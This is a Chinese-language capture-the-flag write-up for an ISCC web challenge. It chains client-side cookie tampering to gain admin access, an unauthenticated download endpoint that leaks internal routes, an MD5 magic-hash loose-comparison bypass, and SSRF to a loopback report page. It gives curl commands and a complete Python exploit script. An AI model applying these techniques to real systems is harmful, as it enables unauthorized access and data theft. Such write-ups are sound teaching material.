
## 详细利用步骤

### 步骤 1 - 挖掘并伪造前端鉴权机制

**关键观察**

打开目标站点首页，我们会发现浏览器 Cookie 中直接明文保存了当前访客的身份与权限标识。页面上的提示文案也印证了后台依然兼容“浏览器侧旧标记”，并且明确指出了后台的管理入口为 `/admin.php`。此时，若将 Cookie 中的 `mail_role` 参数由普通的 `user` 篡改为 `admin`，再次请求该后台页面，HTTP 响应状态便会从禁止访问的 403 变更为成功的 200。这印证了后端程序存在越权漏洞，盲目信任了未经过滤和签名的客户端 Cookie 数据。

**关键命令**

```bash
curl -i -H 'Cookie: mail_user=guest; mail_role=admin' http://39.105.213.28:49103/admin.php
```

**关键输出**

```text
Only admin can access this page. -> 切换 Cookie 后返回后台预览面板 HTML
```

### 步骤 2 - 利用开放接口获取内部路由信息

**关键观察**

系统的 `download.php` 接口允许外部访客随意下载后台相关的说明文档，不存在任何管理员权限校验。由此我们可以首先拉取 `preview-readme.txt`，随后顺藤摸瓜读取 `route-index.txt`。读取该文件后，能够发现联调阶段保留下来的内部接口别名映射关系，其中名为 `final` 的路由对应着一个只能在内网环境中访问的 `report` 视图。这一环节使得我们的攻击目标变得明朗：即寻找方法让服务器去请求这个隐蔽的内网地址。

**关键命令**

```bash
curl 'http://39.105.213.28:49103/download.php?file=files/notes/route-index.txt'
```

**关键输出**

```text
得到 health / mailq / final 三个内部诊断别名，其中 final 对应内网 report 路由
```

### 步骤 3 - 借助哈希碰撞突破复核并达成内网请求

**关键观察**

分析后台的数据提交表单，它要求用户提供两份完全不同的凭证，但系统后端的校验代码却存在典型的缺陷，使用了 `md5($a) == md5($b)` 这种弱类型比较。对此，我们可以传入著名的 MD5 魔术哈希值（例如 `240610708` 与 `QNKCDZO`）来满足该比对条件，顺利通过双人复核逻辑。接下来，将需要请求的 `target_url` 参数指定为本地回环（loopback）地址的完整绝对链接。这里需要格外小心：内部查询的参数必须作为一个整体进行 URL 编码处理，否则类似于 `&slot=last` 的内容会被外部表单引擎直接拆分截断。成功提交后，系统后端的预览组件会以管理员身份在本地（127.0.0.1）读取隐蔽的 report 页面，并在界面上回显包含 flag 的结果。

**关键命令**

```bash
curl -s -H 'Cookie: mail_user=guest; mail_role=admin' -X POST 'http://39.105.213.28:49103/admin.php' -d 'token_a=240610708' -d 'token_b=QNKCDZO' --data-urlencode 'target_url=http://127.0.0.1/internal/report?view=flag&slot=last'
```

**关键输出**

```text
返回结果区回显最终 flag
```

## 最终利用测试

综合上述所有环节，将篡改越权后的 Cookie、用于绕过验证的 magic-hash 凭据以及深度 URL 编码后的本地请求目标组装在一起，向后台预览接口发送数据包即可完成整个利用过程。

**关键命令**

```bash
python3 zhiban_mail_exp.py
```

**关键输出**

```text
ISCC{vX3mQ9sLp7TaN2wK6cRdY8Hz}
```

## 附录1：自动化攻击脚本

```python
#!/usr/bin/env python3
import re
import sys

import requests


BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://39.105.213.28:49103"
MAGIC_A = "240610708"
MAGIC_B = "QNKCDZO"
FINAL_URL = "http://127.0.0.1/internal/report?view=flag&slot=last"


def main() -> int:
    session = requests.Session()
    session.cookies.set("mail_user", "guest")
    session.cookies.set("mail_role", "admin")
    response = session.post(
        f"{BASE_URL}/admin.php",
        data={
            "token_a": MAGIC_A,
            "token_b": MAGIC_B,
            "target_url": FINAL_URL,
        },
        timeout=10,
    )
    response.raise_for_status()
    match = re.search(r"(ISCC\{[^<\s]+\})", response.text)
    if not match:
        print("[!] flag not found")
        print(response.text)
        return 1
    print(match.group(1))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```
